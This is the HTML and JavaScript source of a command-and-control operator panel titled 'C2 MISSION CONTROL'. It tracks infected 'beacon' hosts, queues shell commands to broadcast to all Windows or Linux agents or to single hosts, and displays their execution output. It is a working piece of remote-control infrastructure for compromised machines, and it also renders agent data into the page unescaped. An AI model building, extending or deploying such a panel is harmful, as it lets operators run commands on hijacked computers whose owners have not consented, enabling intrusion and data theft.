<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 MISSION CONTROL</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; }
        .card { background: var(--card); border: 1px solid #333; border-radius: 4px; }
        .table { color: var(--text); font-size: 0.9rem; }
        .terminal-box { 
            background: #000; border: 1px solid #444; color: #fff; 
            font-size: 0.85rem; height: 350px; overflow-y: auto; padding: 10px;
        }
        .status-online { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
        .status-offline { color: #ff4444; }
        .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
        .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
        .seen-text { color: #0dcaf0; font-size: 0.75rem; font-weight: bold; } 
        pre { margin: 0; white-space: pre-wrap; color: #00ff41; background: transparent; border: none; padding: 0; }
        hr { border-color: #333; }
        .badge-os { font-size: 0.6rem; text-transform: uppercase; }
        .btn-purge { color: #ff4444; border-color: #442222; font-size: 0.7rem; }
        .btn-purge:hover { background: #442222; color: #fff; }
    </style>
</head>
<body class="p-4">
    <div class="container-fluid">
        <div class="row mb-3 align-items-center">
            <div class="col-md-8"><h2 class="text-neon m-0">C2_STRATEGIC_COMMAND</h2></div>
            <div class="col-md-4 text-end">
                <span class="p-2 border border-success">ACTIVE_BEACONS: <span id="agent-count">0</span></span>
            </div>
        </div>

        <div class="row g-3">
            <div class="col-lg-8">
                <div class="card p-3">
                    <h6 class="text-muted">LIVE_ASSET_INVENTORY</h6>
                    <table class="table">
                        <thead>
                            <tr><th>HOSTNAME</th><th>OS_VERSION</th><th>RELAY</th><th>LAST_SEEN</th><th>STATUS</th></tr>
                        </thead>
                        <tbody id="agent-table"></tbody>
                    </table>
                </div>
            </div>

            <div class="col-lg-4">
                <div class="card p-3">
                    <h6 class="text-muted">ACTIVE_TASK_QUEUE</h6>
                    <div id="queue-list" class="terminal-box"></div>
                </div>
            </div>

            <div class="col-lg-12">
                <div class="card p-3">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <h6 class="text-muted m-0">INSTRUCTION_UPLINK</h6>
                        <button class="btn btn-outline-danger btn-purge" onclick="purgeQueue()">PURGE_TASK_QUEUE</button>
                    </div>
                    <form id="cmd-form">
                        <div class="input-group">
                            <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary" style="max-width: 250px;">
                                <option value="ALL">BROADCAST_ALL</option>
                                <option value="BROADCAST_WINDOWS">BROADCAST_WINDOWS</option>
                                <option value="BROADCAST_LINUX">BROADCAST_LINUX</option>
                                <optgroup label="WINDOWS_ASSETS" id="opt-windows"></optgroup>
                                <optgroup label="LINUX_ASSETS" id="opt-linux"></optgroup>
                            </select>
                            <input type="text" name="command" class="form-control bg-dark text-white border-secondary" placeholder="ENTER COMMAND..." required>
                            <button class="btn btn-outline-success">TRANSMIT_CMD</button>
                        </div>
                    </form>
                </div>
            </div>

            <div class="col-lg-12">
                <div class="card p-3">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <h6 class="text-muted m-0">EXECUTION_OUTPUT_HISTORY</h6>
                        <div class="d-flex gap-2">
                            <input type="text" id="search-box" class="form-control form-control-sm bg-dark text-white border-secondary" placeholder="Search keywords..." style="width: 200px;">
                            <select id="os-filter" class="form-select form-select-sm bg-dark text-white border-secondary" style="width: 150px;">
                                <option value="ALL">All Systems</option>
                                <option value="Windows">Windows Only</option>
                                <option value="Linux">Linux Only</option>
                            </select>
                        </div>
                    </div>
                    <div id="results-feed" class="terminal-box" style="height: 450px;"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let seenResultIds = new Set();

        function applyFilters() {
            const query = document.getElementById('search-box').value.toLowerCase();
            const osType = document.getElementById('os-filter').value;
            document.querySelectorAll('.feed-item').forEach(item => {
                const text = item.innerText.toLowerCase();
                const itemOS = item.getAttribute('data-os');
                const matchesSearch = text.includes(query);
                const matchesOS = (osType === 'ALL' || itemOS === osType);
                item.style.display = (matchesSearch && matchesOS) ? "block" : "none";
            });
        }

        async function purgeQueue() {
            if(confirm("Are you sure you want to clear all pending tasks? Agents that haven't checked in will miss these commands.")) {
                await fetch('/admin/purge_tasks', { method: 'POST' });
                updateDashboard();
            }
        }

        async function updateDashboard() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();

                document.getElementById('agent-count').innerText = data.total_count;

                const selectWin = document.getElementById('opt-windows');
                const selectLin = document.getElementById('opt-linux');
                const table = document.getElementById('agent-table');
                const savedVal = document.getElementById('target-select').value;

                table.innerHTML = ''; selectWin.innerHTML = ''; selectLin.innerHTML = '';

                data.agents.forEach(agent => {
                    const statusClass = agent.status === "ONLINE" ? "status-online" : "status-offline";
                    table.innerHTML += `<tr>
                        <td><b>${agent.hostname}</b></td>
                        <td><small>${agent.os}</small></td>
                        <td>${agent.relay}</td>
                        <td>${agent.last_seen}</td>
                        <td class="${statusClass}">● ${agent.status}</td>
                    </tr>`;

                    const opt = `<option value="${agent.hostname}">${agent.hostname}</option>`;
                    if (agent.os.toLowerCase().includes("windows")) selectWin.innerHTML += opt;
                    else selectLin.innerHTML += opt;
                });
                document.getElementById('target-select').value = savedVal;

                const qList = document.getElementById('queue-list');
                qList.innerHTML = '';
                if (data.queue.length === 0) {
                    qList.innerHTML = '<div class="text-muted text-center mt-5">NO ACTIVE TASKS IN QUEUE</div>';
                } else {
                    data.queue.forEach(task => {
                        qList.innerHTML += `<div class="mb-2">
                            <span class="badge-pending">TASK</span> <small class="text-info">${task.target}</small>: ${task.command}<br>
                            <span class="seen-text">Seen by: ${task.seen_list.join(', ') || 'None'}</span><hr>
                        </div>`;
                    });
                }

                const resFeed = document.getElementById('results-feed');
                data.results.forEach(res => {
                    if (!seenResultIds.has(res.id)) {
                        seenResultIds.add(res.id);
                        const div = document.createElement('div');
                        div.className = "feed-item mb-3";
                        div.setAttribute('data-os', res.os);
                        const badgeClass = res.os === 'Windows' ? 'bg-primary' : (res.os === 'Linux' ? 'bg-warning text-dark' : 'bg-secondary');
                        div.innerHTML = `
                            <span class="text-muted">[${res.timestamp}]</span> 
                            <span class="badge badge-os ${badgeClass}">${res.os}</span>
                            <span class="text-info"> ${res.hostname} ></span> 
                            <pre>${res.output}</pre><hr>`;
                        resFeed.prepend(div);
                    }
                });
                applyFilters();
            } catch (e) { console.error("Poll error", e); }
        }

        document.getElementById('search-box').oninput = applyFilters;
        document.getElementById('os-filter').onchange = applyFilters;

        document.getElementById('cmd-form').onsubmit = async (e) => {
            e.preventDefault();
            await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
            e.target.reset();
            updateDashboard();
        };

        setInterval(updateDashboard, 3000);
        updateDashboard();
    </script>
</body>
</html>
